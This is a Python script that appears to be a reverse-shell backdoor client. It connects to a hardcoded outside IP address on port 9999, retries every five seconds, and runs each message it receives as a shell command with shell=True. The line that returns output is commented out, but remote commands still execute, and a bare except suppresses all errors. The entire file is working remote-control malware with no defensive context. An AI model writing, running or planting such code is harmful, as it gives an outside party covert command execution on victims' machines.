import socket
import os
import subprocess
import time

s = socket.socket()
host = '103.173.227.65'
port = 9999

is_connect = False


def is_socket_closed(sock: socket.socket) -> bool:
    try:
        # this will try to read bytes without blocking and also without removing them from buffer (peek only)
        sock.setblocking(0)
        data = sock.recv(16, socket.MSG_PEEK)
        if len(data) == 0:
            return True
    except BlockingIOError:
        return False  # socket is open and reading from it would block
    except ConnectionResetError:
        return True  # socket was closed for some other reason
    except Exception as e:
        return False
    return False


while True:
    try:
        if not is_connect:
            print('Trying connect')
            s.connect((host, port))
            print('Connected to server')
            is_connect = True
        else:
            if is_socket_closed(sock=s):
                print('Retry connect')
                time.sleep(5)
                is_connect = False
                s = socket.socket()
                continue
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            print(data)
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            currentWD = os.getcwd() + "> "
            # s.send(str.encode(output_str + currentWD))
            # print(output_str)
    except:
        pass
